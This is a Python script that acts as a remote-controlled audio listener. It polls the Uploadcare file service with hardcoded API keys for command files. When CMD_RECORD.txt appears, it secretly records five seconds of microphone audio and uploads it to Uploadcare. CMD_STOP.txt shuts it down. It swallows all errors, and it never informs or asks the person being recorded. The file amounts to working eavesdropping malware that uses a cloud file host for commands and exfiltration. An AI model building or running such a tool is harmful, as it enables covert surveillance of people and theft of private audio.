import json
import os
import sys
import time
import urllib.request
import sounddevice as sd
import soundfile as sf

PUBLIC_KEY = "268436c97119fc09a608"
SECRET_KEY = "ca00ccfe9ab2096ba638"


def record_audio_native(filename="my_voice.wav", duration=5):
    """تسجيل الصوت باستخدام مكتبة sounddevice المتوافقة مع بايثون بشكل عام."""
    try:
        print("🎙️ جاري تسجيل الصوت...")
        fs = 44100  # معدل العينة (Sample Rate)
        # تسجيل الصوت بالمدة المحددة
        audio_data = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()  # انتظار حتى ينتهي التسجيل
        
        # حفظ الملف بصيغة WAV حقيقية
        sf.write(filename, audio_data, fs)
        print("✅ تم حفظ التسجيل بنجاح.")
    except Exception as e:
        print("خطأ في التسجيل:", e)


def upload_file(filepath):
    """رفع ملف الصوت إلى Uploadcare."""
    try:
        boundary = "----UploadcareBoundary12345"
        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            file_bytes = f.read()

        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="UPLOADCARE_PUB_KEY"\r\n\r\n'
            f"{PUBLIC_KEY}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="UPLOADCARE_STORE"\r\n\r\n'
            f"1\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: audio/wav\r\n\r\n"
        ).encode("utf-8") + file_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")

        req = urllib.request.Request(
            "https://upload.uploadcare.com/base/",
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            },
            method="POST",
        )
        urllib.request.urlopen(req)
    except Exception:
        pass


def delete_file(file_uuid):
    """حذف ملف الأمر بعد استلامه."""
    try:
        req = urllib.request.Request(
            f"https://api.uploadcare.com/files/{file_uuid}/", method="DELETE"
        )
        req.add_header(
            "Authorization", f"Uploadcare.Simple {PUBLIC_KEY}:{SECRET_KEY}"
        )
        req.add_header("Accept", "application/vnd.uploadcare-v0.7+json")
        urllib.request.urlopen(req)
    except Exception:
        pass


def start_listener():
    """حلقة الفحص المستمر للأوامر عبر Uploadcare API."""
    print("🚀 بدء تشغيل خدمة الاستماع عن بعد...")
    while True:
        try:
            api_url = "https://api.uploadcare.com/files/?ordering=-datetime_uploaded&limit=1"
            req = urllib.request.Request(api_url)
            req.add_header(
                "Authorization", f"Uploadcare.Simple {PUBLIC_KEY}:{SECRET_KEY}"
            )
            req.add_header("Accept", "application/vnd.uploadcare-v0.7+json")

            with urllib.request.urlopen(req) as response:
                data = json.loads(response.read().decode("utf-8"))
                results = data.get("results", [])

                if results:
                    latest = results[0]
                    filename = latest.get("original_filename", "")
                    file_uuid = latest.get("uuid")

                    # 1. أمر بدء التسجيل
                    if filename == "CMD_RECORD.txt":
                        delete_file(file_uuid)
                        audio_file = "my_voice.wav"
                        record_audio_native(audio_file, duration=5)
                        upload_file(audio_file)

                    # 2. أمر الإيقاف التام
                    elif filename == "CMD_STOP.txt":
                        delete_file(file_uuid)
                        sys.exit(0)

        except Exception:
            pass

        time.sleep(10)


if __name__ == "__main__":
    start_listener()
